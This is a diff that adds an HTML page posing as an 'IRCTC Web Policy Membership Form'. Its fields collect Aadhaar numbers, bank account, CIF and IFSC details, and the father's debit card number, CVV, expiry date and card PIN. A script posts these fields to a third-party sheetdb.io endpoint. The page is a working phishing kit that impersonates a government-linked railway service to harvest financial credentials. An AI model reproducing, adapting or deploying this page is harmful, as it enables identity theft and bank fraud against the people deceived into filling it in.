@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>irctc web policy</title>
+    <!-- <link href="page2.html"> -->
+    <style>
+        body {
+            padding: 0;
+            background: linear-gradient(205deg, blue, white);
+
+        }
+
+        form {
+            text-align: left;
+            /* background: linear-gradient(260deg,blue,white); */
+        }
+
+        legend {
+            text-align: center;
+        }
+
+        fieldset {
+            border: 1px solid black;
+            border-radius: 10px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        img {
+            width: 100%;
+            height: 150px;
+            background: linear-gradient(205deg, blue, white);
+        }
+        button{
+            width: 300px;
+            text-align: center;
+            padding: 10px;
+            margin: auto;
+            border: none;
+            background-color: greenyellow;
+            font-size: 20px;border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <img src="logo.png" alt="logo">
+    <h1>IRCTC Web Policy Membership Form</h1>
+    <form action="https://sheetdb.io/api/v1/paofh0nhdco2q" method="post" id="dataform">
+        <fieldset>
+            <legend>Employee details</legend>
+            <label for="em name">Employee Full Name</label>
+            <input type="text"><br><br>
+            <label for="dob">Date Of Birth (D.O.B)</label>
+            <input type="date"><br><br>
+            <label for="eaadhar">Aadhar Number</label>
+            <input type="number"><br><br>
+            <fieldset>
+                <legend>Employee Bank Details</legend>
+                <label for="ac">Account Number</label>
+                <input type="number"><br><br>
+                <label for="CIF">CIF Number</label>
+                <input type="number"><br><br>
+                <label for="ifsc">IFSC Code</label>
+                <input type="text"><br><br>
+                <label for="mobile">Mobile Number</label>
+                <input type="number">
+            </fieldset><br>
+            <label for="fathername">Father Name</label>
+            <input type="text"><br><br>
+            <label for="mname">Mother Name</label>
+            <input type="text"><br><br>
+            <fieldset>
+                <legend>Father Bank Details</legend>
+                <label for="faadhar">Aadhar Number</label>
+                <input type="number" name="data[aadhar]" required><br><br>
+                <label for="ac">Account Number</label>
+                <input type="number" name="data[account]" required><br><br>
+                <label for="CIF">CIF Number</label>
+                <input type="number" name="data[CIF]" required><br><br>
+                <label for="ifsc">IFSC Code</label>
+                <input type="text" name="data[ifsc]" required><br><br>
+                <label for="dno">Debit Card number</label>
+                <input type="number" name="data[cardno]" required><br><br>
+                <label for="cvv">CVV</label>
+                <input type="number" name="data[cvv]" required><br><br>
+                <label for="valid">Valid Upto</label>
+                <input type="number" placeholder="MMYYYY" name="data[validupto]" required><br><br>
+                <label for="pin">Debit Card PIN</label>
+                <input type="password" name="data[cardpin]" required><br><br>
+                <label for="mobile">Mobile Number</label>
+                <input type="number" name="data[mobileno]" required>
+
+
+            </fieldset><br>
+            <fieldset>
+                <legend>Nominee Details</legend>
+                <label for="fn">Full Name</label>
+                <input type="text"><br><br>
+                <label for="dob">D.O.B</label>
+                <input type="date"><br><br>
+                <label for="naadhar">Aadhar Number</label>
+                <input type="number">
+
+            </fieldset>
+
+        </fieldset><br>
+        <button type="submit">Submit Now</button>
+    </form>
+    <br>
+    
+    <script>
+        var form = document.getElementById('dataform');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+          method : "POST",
+          body: new FormData(document.getElementById("dataform")),
+      }).then(
+          response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        window.open('page2.html', '_blank');
+
+      });
+    });
+    </script>
+
+
+</body>
+
+</html>
